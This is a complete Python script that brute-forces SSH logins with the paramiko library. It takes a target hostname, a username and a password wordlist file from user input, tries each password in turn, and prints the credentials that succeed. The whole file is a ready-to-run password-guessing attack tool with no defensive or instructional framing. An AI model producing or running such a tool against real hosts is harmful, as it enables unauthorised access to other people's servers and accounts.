import paramiko

count = 1


def connect_ssh(h_name, port, u_name, pass_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(pass_file, "r") as f:
        global count

        for password in f.readlines():
            password = password.strip()

            try:
                client.connect(h_name, port=port, username=u_name, password=password)
                print("[" + str(count) + "] " + "[+] Password Success ~ " + password)
                print("*" * 50)
                print("HostName: " + h_name)
                print("UserName: " + u_name)
                print("Password: " + password)
                print("*" * 50)
                break

            except Exception as e:
                print("[" + str(count) + "] " + "[-] Password Failed ~ " + password, e)
                count += 1


h_name = input("[*] Enter HostName: ")
u_name = input("[*] Enter UserName: ")
password_file = input("[*] Enter Passwords File: ")

connect_ssh(h_name, 22, u_name, password_file)
